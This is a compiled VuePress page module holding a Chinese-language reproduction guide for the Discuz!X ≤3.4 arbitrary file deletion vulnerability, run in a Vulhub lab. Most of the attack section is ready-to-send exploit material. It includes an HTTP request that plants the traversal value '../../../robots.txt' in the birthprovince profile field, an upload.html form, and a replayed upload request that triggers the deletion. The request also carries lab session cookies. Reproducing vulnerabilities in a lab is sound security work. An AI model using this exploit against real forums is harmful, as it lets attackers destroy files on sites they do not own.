import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as d,c as s,a as e,b as i,d as o,e as l}from"./app-58e4a7d6.js";const r={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p={href:"https://lorexxar.cn/2017/09/30/dz-delete/",target:"_blank",rel:"noopener noreferrer"},u=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Discuz!X ≤3.4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行下列命令部署 Discuz!X 安装环境</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动后，访问<code>http://your-ip/install/</code>来安装discuz，只用修改数据库地址为<code>db</code>，其他保持默认即可。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221313350.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221314844.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注册用户后，在个人设置页面找到自己的formhash：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221316746.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>带上自己的Cookie、formhash发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1
Host: 192.168.174.128
Content-Length: 370
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.174.128
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW8uA1wbCsmuiargU
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.174.128/home.php?mod=spacecp&amp;ac=profile&amp;op=base
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: AuthSession=dGhyZWVraTo2MjE0NEM0Mzrhe4V-bNxBqV-1RKA7mJS_YQrC9A; ot6_visitedfid=2; ot6_sid=9yWYy0; et56_2132_saltkey=qN7vqIdT; et56_2132_lastvisit=1645503280; et56_2132_sid=Ze005m; et56_2132_seccode=1.526c82122231460dd9; et56_2132_ulastactivity=6467KkrgcKDQNmUlDxKLd592a6DUvLlRSPU4g07eDld2bKtFo3JU; et56_2132_auth=45cdTg%2F0tTayn1c5i6fOd%2F96K8vGKx7SVg9MgaAoLalS102hICOtVzWjuDHbYtyyH8Rqe54O1WS9d%2Fa0s%2FIV; et56_2132_nofavfid=1; et56_2132_onlineusernum=1; et56_2132_noticeTitle=1; et56_2132_lastact=1645507206%09home.php%09misc
Connection: close

------WebKitFormBoundaryW8uA1wbCsmuiargU
Content-Disposition: form-data; name=&quot;formhash&quot;

d32e951d
------WebKitFormBoundaryW8uA1wbCsmuiargU
Content-Disposition: form-data; name=&quot;birthprovince&quot;

../../../robots.txt
------WebKitFormBoundaryW8uA1wbCsmuiargU
Content-Disposition: form-data; name=&quot;profilesubmit&quot;

true
------WebKitFormBoundaryW8uA1wbCsmuiargU--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221322360.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221323368.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>说明我们的脏数据已经进入数据库了。</p><p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;body&gt;
    &lt;form action=&quot;http://[your-ip]/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=[form-hash]&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; /&gt;
        &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;
    &lt;/form&gt;
&lt;/body&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用浏览器打开该页面，上传一个正常图片。如果遇到下图这样的情况，需要修改数据包。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221436463.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Burpsuite抓包，将Refer和Cookie替换为正常上传数据包的值。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=d32e951d HTTP/1.1
Host: 192.168.174.222
Content-Length: 3685
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.159
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKSoP7vDw487SX9LO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: [替换为http://192.168.174.128/home.php?mod=spacecp]
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: [替换为正常上传的C]
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时脏数据应该已被提取出，漏洞已经利用结束。</p><p>再次访问<code>http://your-ip/robots.txt</code>，发现文件成功被删除。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221451120.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,27);function m(v,b){const a=t("ExternalLinkIcon");return d(),s("div",null,[c,e("p",null,[i("漏洞详情："),e("a",p,[i("https://lorexxar.cn/2017/09/30/dz-delete/"),o(a)])]),u])}const f=n(r,[["render",m],["__file","Discuz!X ≤3.4 任意文件删除漏洞.html.vue"]]);export{f as default};
